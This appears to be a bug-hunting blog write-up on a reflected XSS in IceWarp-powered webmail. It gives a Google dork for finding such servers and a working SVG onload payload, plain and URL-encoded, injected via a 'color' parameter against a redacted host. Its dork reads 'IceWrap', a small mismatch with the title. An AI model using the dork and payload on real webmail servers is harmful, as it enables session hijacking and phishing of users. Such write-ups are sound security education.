# Reflected XSS using Google Dorking on webmail application powered by IceWarp Server

> **Author**: Yash Pawar @HackersParadise
> **Published**: Dec 27, 2025

---

![Yash Pawar @HackersParadise](https://miro.medium.com/v2/resize:fill:32:32/1*ZO75-ERN6RCrSpOXHJG4PA.jpeg)

52

1

Listen

Share

While hunting for reflected XSS, instead of blindly testing random parameters, search engines can be used as a passive reconnaissance tool. Google dorking helps identify specific applications and technologies that historically contain reflection points. In this case, a webmail application powered by IceWarp Server was identified.

![image](https://miro.medium.com/v2/resize:fit:700/1*e3typJJYyD0Y4cGSnKxe6A.png)

DORK — inurl:/webmail/ intext:Powered by IceWrap Server

## Get Yash Pawar @HackersParadise’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

One of the results exposed a webmail endpoint with a color parameter. The parameter value was reflected in the HTML response.

![image](https://miro.medium.com/v2/resize:fit:700/1*I3UCImfhdHMrWKZaSuOB4A.png)

- The actual target URL has been intentionally hidden to follow responsible disclosure practices.

```
https://mail.[REDACTED-DOMAIN]/webmail/
```

- Reflection testing To confirm reflection, a simple test value was added to the color parameter.

```
?color=yash
```

![image](https://miro.medium.com/v2/resize:fit:700/1*xq8iicr9F18rhLV38tO_Xg.png)

- The value yash was observed in the page source, confirming that user input is reflected without proper encoding.
- After confirming reflection, a minimal XSS payload was injected. The payload was URL encoded to ensure proper transmission.

```
"><svg/onload=alert(1)>
```

- URL Encoded : %22%3E%3Csvg/onload=alert(1)%3E

```
https://mail.[REDACTED-DOMAIN]/webmail/?color=%22%3E%3Csvg/onload=alert(1)%3E
```

- When the URL was opened in the browser, a JavaScript alert popup appeared immediately, confirming reflected XSS.

![image](https://miro.medium.com/v2/resize:fit:700/1*vOE-181Ga2s9DflEFu0RLg.png)

IMPACT : An attacker can craft a malicious URL and send it to a victim via email or messaging platforms. Once clicked, the payload executes in the victim browser under the webmail origin. This can lead to session hijacking, phishing attacks, or unauthorized actions within the application.



---
*Original URL: [https://medium.com/@yashpawar1199/reflected-xss-using-google-dorking-on-webmail-application-powered-by-icewarp-server-aea90b17d1f4?source=search_post---------111-----------------------------------](https://medium.com/@yashpawar1199/reflected-xss-using-google-dorking-on-webmail-application-powered-by-icewarp-server-aea90b17d1f4?source=search_post---------111-----------------------------------)*
